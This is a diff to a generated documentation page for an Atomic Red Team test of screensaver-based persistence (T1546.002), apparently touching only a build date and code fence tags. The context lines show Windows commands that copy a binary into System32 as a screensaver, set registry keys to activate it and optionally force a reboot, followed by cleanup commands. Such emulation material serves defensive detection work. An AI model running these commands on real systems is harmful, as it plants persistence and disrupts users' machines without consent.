@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.002"
 attack_technique_name: "Event Triggered Execution: Screensaver"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "281201e7-de41-4dc9-b73d-f288938cbb64"
@@ -58,7 +58,7 @@ This test copies a binary into the Windows System32 folder and sets it as the sc
 
 ### Command
 
-```commandprompt
+```cmd
 reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
 copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
 reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
@@ -70,7 +70,7 @@ if #{reboot} NEQ 0 shutdown /r /t 0
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg import %userprofile%\backup.reg
 del %userprofile%\backup.reg
 del %SystemRoot%\System32\evilscreensaver.scr
